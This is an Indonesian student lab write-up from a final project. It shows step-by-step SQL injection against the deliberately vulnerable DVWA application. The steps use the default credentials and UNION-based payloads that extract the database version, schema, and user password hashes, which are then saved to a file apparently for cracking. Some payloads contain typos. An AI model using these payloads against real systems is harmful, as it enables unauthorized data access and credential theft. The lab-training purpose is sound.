# Tugas Final Project

### Anggota Kelompok

|Nama      |NRP    |
|---|---|
Rian Danis  | 5114100084
Naufan Arifie | 5114100136
Dimas Hirda P | 5114100147


### DVWA
  ### Lesson 6

#### 1. Jalankan Firefox
#### 2. Login ke DVWA
1. Masukkan alamat http://192.168.1.106/dvwa/login.php (Sesuaikan IP dengan IP system)
2. Login : admin
+ Passworn: password
+ login
#### 3. Tentukan Level Sekuritas DVWA
1. Klik DVWA Security pada menu sebelah kiri
+ pilih "low"
+ submit

#### 4. Menu SQL Injection
1. Pilih "SQL Injection" dari menu sebelah kiri

#### 5. Basic Injection
1. Input "1" pada text box.
2. Submit
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%206/Basic.PNG)

#### 6. Always True Scenario
1. Inputkan text %' or '0'='0
2. Submit
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%206/Always_true.PNG)

#### 7. Display Database Version
1. Inputkan text %' or 0=0 union select null, version() #
2. Submit
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%206/Basic.PNG)

#### 8. Display Database User
1. Inputkan %' or 0=0 union select null, user() #
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%206/Basic.PNG)

#### 9. Display Database Name
1. Inputkan %' or 0=0 unuon select null, database () #
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%206/Basic.PNG)

#### 10. Display all tables in information_schema
1. Inputkan %' an 1=0 union select null, table_name from information_schema.tables #
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%206/Basic.PNG)

#### 11. Display all columns fields dalam information_schema user table
1. Inputkan %' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns 
where table_name = 'users' #
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%206/Basic.PNG)

#### 12. Display all columns fields contents dalam information_schema user table
1. Inputkan %' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%206/Basic.PNG)

#### Create Password Hash File
1. Copy hash password dan admin
2. Paste kedalam leafpad
3. Save
![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%206/Basic.PNG)

